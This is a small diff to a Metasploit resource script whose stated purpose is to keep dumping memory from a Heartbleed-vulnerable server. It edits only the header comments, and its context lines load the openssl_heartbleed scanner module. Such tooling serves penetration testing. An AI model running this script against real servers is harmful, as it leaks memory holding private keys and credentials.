@@ -1,6 +1,7 @@
 <ruby
-# A Metasploit resource file to continuously dump memory from a Heartbleed Victim
-# Created by: Nick Sanzotta (@Beamr)
+# Description: A Metasploit resource file to continuously dump memory from a Heartbleed Victim
+# Created by: Nick Sanzotta/@beamer
+# Script Version: heartbleed.rc v1.0
 require 'time'
 
 self.run_single("use auxiliary/scanner/ssl/openssl_heartbleed")
